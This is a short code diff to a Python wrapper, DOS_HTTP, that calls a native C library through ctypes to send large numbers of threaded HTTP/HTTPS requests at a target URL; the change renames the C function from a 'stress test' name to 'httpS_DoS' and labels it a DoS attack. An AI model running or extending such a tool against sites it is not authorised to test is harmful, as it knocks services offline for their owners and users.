@@ -48,7 +48,7 @@ def DOS_HTTP(
     verify_certif: Optional[int] = 1,
     verify_hostname: Optional[int] = 1,
 ):
-    """Launches a HTTP/HTTPS DoS attack against an website."""
+    """Launches a HTTP/S DoS attack against an website."""
     
     if num_threads is None:
         num_threads = os.cpu_count() or 4
@@ -72,7 +72,7 @@ def DOS_HTTP(
     http_lib = ctypes.CDLL(LIB_FILE_HTTP)
 
     # Bind argument signature & return structure
-    http_lib.run_http_stress_test.argtypes = [
+    http_lib.httpS_DoS.argtypes = [
         ctypes.c_char_p,       # url
         ctypes.c_int,          # total_requests
         ctypes.c_int,          # num_threads
@@ -82,7 +82,7 @@ def DOS_HTTP(
         ctypes.c_int,          # verify_hostname
     ]
     
-    http_lib.run_http_stress_test.restype = TestResult
+    http_lib.httpS_DoS.restype = TestResult
 
     actual_total = total_requests
 
@@ -103,7 +103,7 @@ def DOS_HTTP(
     start_time = time.time()
 
     # Invoke native C function
-    result = http_lib.run_http_stress_test(
+    result = http_lib.httpS_DoS(
         target_url.encode("utf-8"),
         actual_total,
         num_threads,
